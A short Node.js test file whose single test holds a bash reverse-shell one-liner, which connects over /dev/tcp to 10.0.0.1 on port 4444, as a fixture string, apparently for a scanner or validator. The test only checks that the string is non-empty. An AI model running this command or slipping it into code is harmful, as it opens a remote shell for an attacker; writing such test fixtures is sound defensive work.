import { test } from 'node:test';
import assert from 'node:assert/strict';
test('fixture', () => {
  const text = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n';
  assert.ok(text.length > 0);
});
